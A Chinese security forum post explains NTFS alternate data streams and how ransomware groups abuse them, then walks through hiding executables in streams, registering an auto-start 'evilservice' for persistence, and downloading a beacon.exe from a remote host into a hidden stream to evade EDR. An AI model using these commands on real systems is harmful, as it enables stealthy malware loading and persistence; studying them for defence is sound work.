# windows杂谈：隐匿加载恶意程序

> **来源**: https://forum.butian.net/share/3053  
> **文章ID**: 3053

---

前言
==

本文将从NTFS交换数据流（ADS）介绍入手，分析当前APT组织对其进行利用的手法，来介绍ADS在持久化和加载恶意程序中起到的作用。

ADS简介
=====

NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。

所有的文件在NTFS中至少包含一个主数据流，也就是用户可见的文件或是目录，一个文件在NTFS中真正的文件名称格式：

```php
<文件名>:<流名>:<流种类>
```

其中流种类不常使用，一般都以文件名和流名的方式显示出来。

举个简单的例子，我们新建一个目录，在里面新建一个文件111.txt并填充内容123456，在cmd中使用命令`dir /r /a`（注意不要使用powershell执行该命令）：

```php
 Directory of C:\Users\root\Desktop\testDriver\test0

05/08/2024  03:30 PM    <DIR>          .
05/08/2024  03:30 PM    <DIR>          ..
05/08/2024  03:28 PM                 6 111.txt
               1 File(s)              6 bytes
               2 Dir(s)  42,820,857,856 bytes free
```

在powershell下执行命令：

```php
PS C:\Users\root\Desktop\testDriver\test0> Get-Content .\111.txt -Stream ':$DATA'
123456
```

可以获取到文件的数据流。这个数据流为程序的默认数据流。除了默认数据流外，是否可以创建其他数据流而不在目录中显示呢？

真实世界的ADS利用手法
============

其一 WastedLocker 勒索软件
--------------------

WastedLocker 是一个相对较新的勒索软件家族，自 2020 年 4 月以来一直在被追踪。WastedLocker 喜欢请求以管理权限运行木马。如果木马以非管理权限执行，它将尝试通过UAC绕过来提升权限。一旦提升，勒索软件就会将 System32 中的随机文件副本写入`%APPDATA%`目录。新复制的文件将具有随机且隐藏的文件名。此过程允许勒索软件通过备用数据流 (ADS) 将自身复制到文件中。随后在 `%TEMP%`中创建一个新文件夹，其中包含 WINMM.DLL 和 WINSAT.EXE 的副本。然后，利用 WINMM.DLL 的 `%TEMP%`副本从之前生成的备用数据流中执行勒索软件。

其二 ALPHA SPIDER 勒索软件
--------------------

Alphv 勒索软件即服务首次出现于 2021 年 12 月，因其是第一个使用 Rust 编程语言编写的勒索软件而闻名。 Alphv RaaS 提供了许多旨在吸引复杂附属机构的功能，包括针对多个操作系统的勒索软件变体、高度可定制的变体，每小时都会自我重新编译来逃避杀毒软件。这个勒索软件使用了多个防御规避数据，其中NTFS数据流被他们用来进行持久化，在 `C:\System` 中的多个 Windows 系统上部署了 reverse-ssh 可执行文件，然后将其隐藏在 C 卷根目录中。创建的ADS 名为`Host Process for Windows Service` 。紧接着创建了一个恶意服务，以确保其 reverse-ssh 工具的持久性，然后再从初始位置删除可执行文件。

![](images/1715154833241-0da82cf3-2305-48f6-bd98-64d61187cca6.png)

ADS 的利用
=======

上面我简要介绍了ADS是什么，下面我们来熟悉一下ADS的使用方法和利用手法。

首先，我们重新创建一个文件：

```php
echo AnyData > MyFile.txt
```

查看`dir`：

```php
>dir MyFile.txt
 Volume in drive C has no label.
 Volume Serial Number is F87D-6A1F

 Directory of C:\Users\root\Desktop\testDriver

05/07/2024  07:28 PM                10 MyFile.txt
               1 File(s)             10 bytes
               0 Dir(s)  42,828,369,920 bytes free
```

使用powershell查看文件流：

```php
>Get-Content .\MyFile.txt -Stream ':$DATA'
AnyData
```

命令 `Get-Content .\MyFile.txt -Stream ':$DATA'`在 PowerShell 中使用，其目的是从指定文件的特定数据流中读取内容。下面是命令各部分的具体解释：

`Get-Content`: 这是一个 PowerShell 命令，用于读取文件的内容。

`.\MyFile.txt`: 指定了要读取内容的文件路径，当前使用的是相对路径，有的时候则需要使用绝对路径（下文会看到）

`-Stream ':$DATA'`: 指定从文件中的特定数据流读取内容。在这里 `:$DATA` 是指要访问的备用数据流的名称。

`:$DATA`是 NTFS 文件系统中默认的数据流，通常简称为 "数据流"，它存储文件的主体内容。在绝大多数情况下，当用户查看或编辑文件时，实际上是在访问 `:$DATA` 流。然而，如果文件有其他命名的备用数据流，这些数据流不会在文件浏览器中显示，也不会占用显而易见的磁盘空间（不过它们确实占用总磁盘空间）。

如果我们想查看一个文件的所有数据流可以使用下面的指令：

```php
Get-Item -Path .\MyFile.txt -Stream *
```

这将列出文件的所有数据流，包括默认的 `:$DATA` 流和可能存在的任何其他备用数据流。

```php
> Get-Item -Path .\MyFile.txt -Stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver\MyFile.txt::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver
PSChildName   : MyFile.txt::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\root\Desktop\testDriver\MyFile.txt
Stream        : :$DATA
Length        : 10
```

通过这种方式，`Get-Content .\MyFile.txt -Stream ':$DATA'` 命令在大多数情况下等同于简单地使用 `Get-Content .\MyFile.txt`，因为 `:$DATA` 是默认的主数据流。

数据直接写入文件流：

```php
Write-Output 'SecretMessage' | Set-Content .\MyFile.txt -Stream 'Secret'
```

但是大多数的时候我们都是从文件中读取数据，不会这样手动输入，因此使用`Get-Content`获取文件数据后管道写入数据流中，如下所示：

```php
> Get-Content .\MyFile.txt | Set-Content .\MyFile.txt -Stream 'Secret1'
> cat .\MyFile.txt -Stream Secret1
```

但是我们查看MyFile.txt文件，其实内容还是没发生改变的：

```php
> cat .\MyFile.txt
AnyData
```

如果我们想查看这个加密内容，则需要使用：

```php
> cat .\MyFile.txt -Stream Secret
SecretMessage
```

再次查看文件流：

```php
> Get-Item -Path .\MyFile.txt -Stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver\MyFile.txt::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver
PSChildName   : MyFile.txt::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\root\Desktop\testDriver\MyFile.txt
Stream        : :$DATA
Length        : 10

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver\MyFile.txt:Secret
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\root\Desktop\testDriver
PSChildName   : MyFile.txt:Secret
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\root\Desktop\testDriver\MyFile.txt
Stream        : Secret
Length        : 15
```

注意：这种数据流是跟当前系统绑定的，如果我们把这个文件或者文件夹复制到其他系统中，就没有效果了。所以需要是木马落地后再进行的操作。

```php
PS C:\Users\root\Desktop\testDriver> Get-Alias echo

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           echo -> Write-Output
```

下面需要使用cmd，不要使用powershell

```php
type C:\Windows\System32\calc.exe > MyFile.txt:Calculator
```

接着输入`dir /r`：

```php
C:\Users\root\Desktop\testDriver>dir /r
 Volume in drive C has no label.
 Volume Serial Number is F87D-6A1F

 Directory of C:\Users\root\Desktop\testDriver

05/07/2024  07:34 PM    <DIR>          .
05/07/2024  07:34 PM    <DIR>          ..
05/07/2024  07:56 PM                10 MyFile.txt
                                27,648 MyFile.txt:Calculator:$DATA
                                    15 MyFile.txt:Secret:$DATA
               1 File(s)             10 bytes
               2 Dir(s)  42,825,474,048 bytes free
```

powershell执行：

```php
> type ./MyFile.txt:Secret
SecretMessage
```

但是假如我们想执行calc，使用`./MyFile.txt:Calculator`是否可行呢？

```php
PS C:\Users\root\Desktop\testDriver> ./MyFile.txt:Calculator
Program 'Calculator' failed to run: The system cannot find the file specifiedAt line:1 char:1
+ ./MyFile.txt:Calculator
+ ~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ ./MyFile.txt:Calculator
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

这里其实可以使用wmic来执行：

```php
wmic process call create +绝对路径
```

![](images/1715083567069-5536cb17-5d00-4b8d-9c93-ae7a5e81acf8.png)

![](images/1715086195033-52cf5988-c97b-4f07-94fa-c23b08766792.png)

```php
type c:\windows\system32\cmd.exe > %CD%file.txt:cmd.exe
sc create evilservice binPath= "\"%CD%file.txt:cmd.exe\" /c echo works > \"%CD%works.txt\"" DisplayName= "evilservice" start= auto
sc start evilservice
```

这里通过注册服务来达到开机自启动的效果。

测试驱动加载
======

经过测试，无法加载驱动。因为驱动需要指定固定路径，无法从ADS数据流中进行加载。

整体流程
====

创建基础文件
------

```php
echo AnyData > MyFile.txt
```

制作隐藏恶意ADS文件流
------------

使用powershell：

```php
Get-Content -Path "C:\windows\system32\cmd.exe" -Raw | Set-Content -Path "$($PWD.Path)\MyFile.txt:cmd.exe" -Stream cmd.exe
```

使用cmd查看生成的数据流：

```php
 Directory of C:\Users\root\Desktop\testfile

05/08/2024  09:49 AM    <DIR>          .
05/08/2024  09:49 AM    <DIR>          ..
05/08/2024  10:04 AM                20 MyFile.txt
                               289,794 MyFile.txt:cmd.exe:$DATA
               1 File(s)             20 bytes
               2 Dir(s)  43,033,567,232 bytes free
```

创建持久化服务
-------

```php
sc create ADS binPath= "\"%CD%\\MyFile.txt:cmd.exe\" /c echo works > \"%CD%\\works.txt\"" DisplayName= "ADS" start= auto
```

查看服务是否创建：

```php
C:\Users\root\Desktop\testfile>sc qc ADS
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: ADS
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Users\root\Desktop\testfileMyFile.txt:cmd.exe" /c echo works > "C:\Users\root\Desktop\testfileworks.txt"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : evilservice
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

执行隐藏的指令
-------

```php
sc start ADS
```

网络加载
----

大多数情况下，我们需要执行的程序都是通过托管在服务器上，然后通过网络加载进行使用的。我们可以使用`Invoke-WebRequest`来进行网络加载：

托管服务器开启web服务：

```php
python -m http.server 8080
```

网络加载方式如下：

```php
$tempFile = "$($PWD.Path)\temp_download"; Invoke-WebRequest -Uri "http://192.168.56.79:8080/beacon.exe" -OutFile $tempFile; Get-Content -Path $tempFile -Raw | Set-Content -Path "$($PWD.Path)\MyFile.txt" -Stream test1; Remove-Item $tempFile -Force
```

优点
--

经过测试，ADS可以用来拷贝程序备份，然后执行，在面对EDR时EDR会删除备份文件而对源文件无影响，达到持久化的目的。

其他
==

api0cradle在2018年总结了一系列第三方软件（LOLBins）来利用ADS的程序，可以灵活在实战时应用，涉及到了以下三种利用方式：

1. Add content to ADS
2. Extract content from ADS
3. Executing from ADS

感兴趣的师傅可以自行了解，感觉测试后蛮多手法都会被数字公司杀掉：<https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f>

参考链接
====

<https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f>

<https://www.crowdstrike.com/blog/anatomy-of-alpha-spider-ransomware/>

<https://www.sentinelone.com/labs/wastedlocker-ransomware-abusing-ads-and-ntfs-file-attributes/>

<https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/>

<https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/>
